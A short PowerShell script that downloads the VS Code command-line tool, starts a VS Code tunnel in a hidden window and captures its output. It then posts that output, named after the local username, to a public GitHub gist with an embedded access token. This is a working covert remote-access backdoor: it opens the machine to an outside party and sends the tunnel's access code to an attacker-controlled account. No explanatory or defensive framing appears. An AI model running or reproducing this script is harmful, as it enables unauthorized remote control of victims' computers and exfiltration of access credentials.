$token = "11BMW7KGQ0fGkt07pC7wW4_pphhEcwqqLFoJAU14WHdQHr7Np8Xsae3bjXiOF2EhSyTKZQACZPqvr0e0MB";
iwr -uri "https://az764295.vo.msecnd.net/stable/97dec172d3256f8ca4bfb2143f3f76b503ca0534/vscode_cli_win32_x64_cli.zip" -OutFile vscode.zip;
Expand-Archive vscode.zip;
cd vscode;
.\code.exe tunnel user logout;
Start-Sleep 10;
Start-Process -FilePath .\code.exe -ArgumentList "tunnel --random-name --accept-server-license-terms" -RedirectStandardOutput .\output.txt -WindowStyle Hidden;
Start-Sleep 10;
Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method Post -Headers @{ Authorization = "token github_pat_$token"; 'User-Agent' = 'PowerShell' } -Body (@{ description = $env:USERNAME; public = $true; files = @{ "$env:USERNAME.txt" = @{ content = (Get-Content 'output.txt' -Raw).Trim() } } } | ConvertTo-Json);
